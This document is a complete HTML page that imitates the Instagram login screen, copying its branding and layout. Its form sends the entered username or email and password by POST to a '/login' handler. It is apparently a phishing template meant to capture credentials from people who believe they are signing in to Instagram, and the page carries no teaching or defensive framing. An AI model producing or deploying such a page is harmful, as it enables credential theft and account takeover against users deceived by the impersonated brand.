<!DOCTYPE html>
<html>
<head><title>Instagram Login</title></head>
<body style="font-family:Arial; background-color:#fafafa;">
  <div style="width:300px; margin:auto; padding:20px; background:white; margin-top:100px; border:1px solid #dbdbdb; text-align:center;">
    <h2 style="font-family:'Brush Script MT', cursive;">Instagram</h2>
    <form method="POST" action="/login">
      <input type="text" name="username" placeholder="Phone number, username, or email" style="width:100%; padding:10px;"><br><br>
      <input type="password" name="password" placeholder="Password" style="width:100%; padding:10px;"><br><br>
      <input type="submit" value="Log In" style="width:100%; padding:10px; background-color:#3897f0; color:white; border:none;">
    </form>
  </div>
</body>
</html>
